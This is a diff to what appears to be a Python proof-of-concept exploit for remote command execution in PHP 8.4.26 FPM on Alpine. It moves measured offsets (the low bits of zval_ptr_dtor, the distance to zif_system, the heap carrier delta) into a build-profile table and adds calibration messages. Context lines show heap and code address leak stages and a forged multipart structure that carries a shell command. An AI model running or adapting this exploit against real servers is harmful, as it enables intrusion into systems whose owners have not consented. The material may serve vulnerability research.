@@ -81,14 +81,38 @@ MIN_POINTER_AGREEMENT = 4
 HEAP_MIN, HEAP_MAX = 0x700000000000, 0x800000000000
 CODE_MIN, CODE_MAX = 0x500000000000, 0x700000000000
 
+@dataclass(frozen=True)
+class BuildProfile:
+    """One PHP binary layout that these constants were calibrated on.
+
+    Text offsets differ per build, so a run against any other build cannot work.
+    Keep this list small and measured; do not guess entries.
+    """
+
+    name: str
+    dtor_low21: int             # low 21 bits of zval_ptr_dtor; ASLR does not move it
+    zif_system_from_dtor: int   # zif_system - zval_ptr_dtor
+    heap_carrier_delta: int     # chunk base -> controlled hold value, measured with four workers
+    heap_carrier_offset: int
+
+
+SUPPORTED_BUILDS = (
+    BuildProfile(name="php:8.4.26-fpm-alpine3.23",
+                 dtor_low21=0x112930,
+                 zif_system_from_dtor=-0x204BC0,
+                 heap_carrier_delta=0x8400000,
+                 heap_carrier_offset=0x16D1D8),
+)
+PROFILE = SUPPORTED_BUILDS[0]
+
 # Fingerprint and offsets measured against the local Alpine PHP 8.4.26 image.
-DTOR_LOW21 = 0x112930
-ZIF_SYSTEM_FROM_DTOR = -0x204BC0
+DTOR_LOW21 = PROFILE.dtor_low21
+ZIF_SYSTEM_FROM_DTOR = PROFILE.zif_system_from_dtor
 
 # Distance from the leaked chunk base to the controlled "hold" field, measured
 # in a local four-worker Alpine setup.
-HEAP_CARRIER_DELTA = 0x8400000
-HEAP_CARRIER_OFFSET = 0x16D1D8
+HEAP_CARRIER_DELTA = PROFILE.heap_carrier_delta
+HEAP_CARRIER_OFFSET = PROFILE.heap_carrier_offset
 
 # The forged structure is one 384-byte multipart value; the command lives
 # inside it after the HashTable, call frame, and zend_string headers.
@@ -288,6 +312,13 @@ def code_consumer() -> bytes:
     return finish_multipart(parts, b)
 
 
+def describe_supported_builds() -> str:
+    """One line that names every calibrated build and its fingerprint."""
+    names = ", ".join(f"{profile.name} (low21 0x{profile.dtor_low21:x})"
+                      for profile in SUPPORTED_BUILDS)
+    return f"This PoC is calibrated for: {names}. Other builds have different text offsets."
+
+
 def code_candidate(cookie: bytes) -> int | None:
     """Require the 16-byte cookie and the observed Alpine code fingerprint.
 
@@ -400,7 +431,10 @@ def final_multipart(heap_base: int, dtor: int, command: bytes) -> bytes:
     if heap_base & CHUNK_MASK or not HEAP_MIN <= heap_base < HEAP_MAX:
         raise ValueError("Heap address is not a plausible aligned Zend chunk")
     if not (CODE_MIN <= dtor < CODE_MAX and dtor & CHUNK_MASK == DTOR_LOW21):
-        raise ValueError("Code address does not match the calibrated Alpine layout")
+        raise ValueError(
+            "Code address does not match the calibrated layout. "
+            + describe_supported_builds()
+            + f" Measured low 21 bits: 0x{dtor & CHUNK_MASK:x}.")
 
     # The leak gives a chunk base; the controlled "hold" value lands at this
     # calibrated distance from it.
@@ -510,6 +544,10 @@ class RecordingReader:
         return value
 
     def close(self):
+        pass
+
+    def flush(self):
+        """http.client calls this when it writes through the file object."""
         pass
 
 
@@ -736,6 +774,8 @@ def main() -> int:
     try:
         preflight(target)
         print("[health] PHP 8.4.26 confirmed", flush=True)
+        print(f"[health] calibrated for {PROFILE.name}; "
+              f"other builds cannot pass the code-leak check", flush=True)
 
         heap, result["heap"] = run_leak_stage(target, STAGES["heap"], output)
         print(f"[heap] strict Zend base {heap:#x}", flush=True)
